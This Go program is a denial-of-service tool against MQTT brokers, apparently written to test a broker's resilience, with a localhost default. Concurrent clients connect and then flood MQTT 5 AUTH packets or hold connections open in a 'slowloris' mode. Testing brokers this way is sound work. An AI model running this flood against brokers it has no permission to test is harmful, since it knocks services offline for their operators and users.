package main

import (
	"bytes"
	"flag"
	"fmt"
	"log"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"github.com/mochi-mqtt/server/v2/packets"
)

var (
	brokerAddr  = flag.String("broker", "localhost:1883", "Address of the MQTT broker")
	concurrency = flag.Int("concurrency", 50, "Number of concurrent attackers")
	duration    = flag.Duration("duration", 10*time.Second, "Duration of the attack")
	attackType  = flag.String("type", "flood", "Type of attack: 'flood' (AUTH packets) or 'slowloris' (open connection, no auth)")
)

func main() {
	flag.Parse()

	log.Printf("Starting Auth Injector -> Broker: %s, Concurrency: %d, Duration: %s, Type: %s", *brokerAddr, *concurrency, *duration, *attackType)

	var totalSent uint64
	var totalErrors uint64
	var totalConnects uint64

	var wg sync.WaitGroup
	deadline := time.Now().Add(*duration)

	for i := 0; i < *concurrency; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()

			for time.Now().Before(deadline) {
				// Connect directly via TCP
				conn, err := net.Dial("tcp", *brokerAddr)
				if err != nil {
					atomic.AddUint64(&totalErrors, 1)
					time.Sleep(500 * time.Millisecond)
					continue
				}

				atomic.AddUint64(&totalConnects, 1)

				// Send MQTT 5 CONNECT
				connectPk := packets.Packet{
					ProtocolVersion: 5,
					FixedHeader: packets.FixedHeader{
						Type: packets.Connect,
					},
					Connect: packets.ConnectParams{
						ProtocolName:     []byte("MQTT"),
						Clean:            true,
						Keepalive:        60,
						ClientIdentifier: fmt.Sprintf("attacker-%d-%d", id, time.Now().UnixNano()),
					},
				}
				var cbuf bytes.Buffer
				connectPk.ConnectEncode(&cbuf)
				_, err = conn.Write(cbuf.Bytes())
				if err != nil {
					conn.Close()
					atomic.AddUint64(&totalErrors, 1)
					time.Sleep(500 * time.Millisecond)
					continue
				}

				if *attackType == "slowloris" {
					// Just hold the connection open
					time.Sleep(1 * time.Second)
					conn.Close()
					continue
				}

				// Flood AUTH packets
				for time.Now().Before(deadline) {
					authPk := packets.Packet{
						ProtocolVersion: 5,
						FixedHeader: packets.FixedHeader{
							Type: packets.Auth,
						},
						ReasonCode: 0,
					}

					var abuf bytes.Buffer
					if err := authPk.AuthEncode(&abuf); err != nil {
						atomic.AddUint64(&totalErrors, 1)
						break
					}

					_, err := conn.Write(abuf.Bytes())
					if err != nil {
						// Connection was likely dropped by the broker
						atomic.AddUint64(&totalErrors, 1)
						time.Sleep(500 * time.Millisecond)
						break
					}

					atomic.AddUint64(&totalSent, 1)
					// Small sleep to not instantly max out local port bandwidth
					time.Sleep(5 * time.Millisecond)
				}
				conn.Close()
			}
		}(i)
	}

	wg.Wait()
	log.Printf("Attack complete. Connections Made: %d, Packets Sent: %d, Errors: %d", totalConnects, totalSent, totalErrors)
}
